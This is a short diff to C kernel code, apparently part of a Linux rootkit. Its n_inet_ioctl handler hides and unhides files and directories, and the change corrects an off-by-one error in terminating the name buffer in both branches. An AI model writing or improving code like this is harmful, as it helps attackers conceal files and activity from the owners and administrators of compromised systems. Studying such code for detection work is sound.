@@ -821,7 +821,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                         return 0;
                     }
 
-                    name[file_args.namelen+1] = 0;
+                    name[file_args.namelen] = 0;
 
                     DEBUG("Hiding file/dir %s\n", name);
 
@@ -850,7 +850,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                         return 0;
                     }
 
-                    name[file_args.namelen + 1] = 0;
+                    name[file_args.namelen] = 0;
 
                     DEBUG("Unhiding file/dir %s\n", name);
 
